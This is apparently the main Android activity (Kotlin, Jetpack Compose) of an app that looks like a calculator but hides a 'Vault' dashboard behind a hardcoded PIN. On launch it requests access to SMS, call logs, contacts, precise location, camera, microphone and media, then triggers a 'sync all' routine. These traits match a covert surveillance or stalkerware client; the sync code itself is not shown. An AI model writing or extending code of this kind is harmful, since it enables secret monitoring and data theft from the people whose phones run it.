package com.example

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.activity.viewModels
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.material3.Surface
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.core.content.ContextCompat
import androidx.compose.animation.AnimatedContent
import androidx.compose.animation.fadeIn
import androidx.compose.animation.fadeOut
import androidx.compose.animation.togetherWith
import androidx.compose.runtime.collectAsState
import com.example.ui.MainViewModel
import com.example.ui.screens.CalculatorScreen
import com.example.ui.screens.DashboardScreen
import com.example.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {

    private val viewModel: MainViewModel by viewModels()

    private var hasAllPermissions by mutableStateOf(false)

    private val requestPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { _ ->
        hasAllPermissions = checkPermissions()
        viewModel.triggerSyncAll()
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        hasAllPermissions = checkPermissions()
        if (!hasAllPermissions) {
            requestAllPermissions()
        }

        setContent {
            MyApplicationTheme {
                val isUnlocked by viewModel.isUnlocked.collectAsState()

                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF111827)
                ) {
                    AnimatedContent(
                        targetState = isUnlocked,
                        transitionSpec = {
                            fadeIn() togetherWith fadeOut()
                        },
                        label = "VaultScreenTransition"
                    ) { unlocked ->
                        if (unlocked) {
                            DashboardScreen(
                                viewModel = viewModel,
                                hasPermissions = hasAllPermissions,
                                onRequestPermissions = { requestAllPermissions() }
                            )
                        } else {
                            CalculatorScreen(
                                viewModel = viewModel,
                                onUnlocked = { viewModel.unlockWithPin("5218") }
                            )
                        }
                    }
                }
            }
        }
    }

    private fun checkPermissions(): Boolean {
        val permissionsToTrack = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissionsToTrack.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToTrack.add(Manifest.permission.POST_NOTIFICATIONS)
            permissionsToTrack.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            permissionsToTrack.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        return permissionsToTrack.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    private fun requestAllPermissions() {
        val permissionsToRequest = mutableListOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            permissionsToRequest.add(Manifest.permission.READ_PHONE_NUMBERS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissionsToRequest.add(Manifest.permission.POST_NOTIFICATIONS)
            permissionsToRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            permissionsToRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        requestPermissionLauncher.launch(permissionsToRequest.toTypedArray())
    }
}
